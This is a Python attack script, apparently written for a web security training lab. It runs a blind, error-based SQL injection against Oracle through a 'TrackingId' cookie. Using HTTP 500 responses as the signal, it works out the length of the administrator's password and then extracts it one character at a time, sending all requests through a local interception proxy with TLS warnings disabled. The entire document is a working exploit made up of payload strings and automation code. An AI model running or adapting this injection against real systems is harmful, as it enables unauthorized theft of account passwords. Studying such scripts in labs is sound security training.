import requests
import sys
from http import cookies
import urllib3

def getCookie(sql_command):
	response = requests.get(url)
	for cookie in response.cookies:
		if cookie.name == cookie_name:
			new_cookie_value = response.cookies[cookie_name] + sql_command
			response.cookies.set(cookie_name, None)
			response.cookies.set(cookie_name, new_cookie_value)
			return response.cookies

def sendSql(sql_command_patern):
	cookie = getCookie(sql_command_patern)
	response = requests.get(url, verify=False, proxies=proxy, cookies=cookie)
	if response.status_code != 500:
		return True
	else:
		return False

def getLenght(sql_command_patern):
	for i in range (0,100):
		sql_command_patern_i= sql_command_patern %(i)
		if sendSql(sql_command_patern_i):
			return i
			break
		else:
			++i


def getPasswordChar(sql_command_patern):
	#32-126 are ASCII printable set
	for j in range(32,126):
		#Exclude ' ;
		if (j == 39 or j == 59):
			continue
		sql_command = sql_command_patern.replace("[CHAR]", chr(j))
		if sendSql(sql_command):
			++j
		else:
			return chr(j)


def main():

	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

	global proxy,url,cookie_name

	url = sys.argv[1]
	proxy = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
	cookie_name = "TrackingId"
	sql_lenght = "'||(SELECT CASE WHEN LENGTH(password)>%s THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
	sql_password = "'||(SELECT CASE WHEN SUBSTR(password,%s,1)='[CHAR]' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"


	password_lenght = getLenght(sql_lenght)

	print ("(+) Looking for the password. Wait...:")
	for i in range(1, int(password_lenght)+1):
		password_char_i = sql_password %i
		password_char = getPasswordChar(password_char_i)
		sys.stdout.write(password_char)
		sys.stdout.flush()
		++i
	print ("\n(+) done!")


if __name__ == '__main__':
    main()
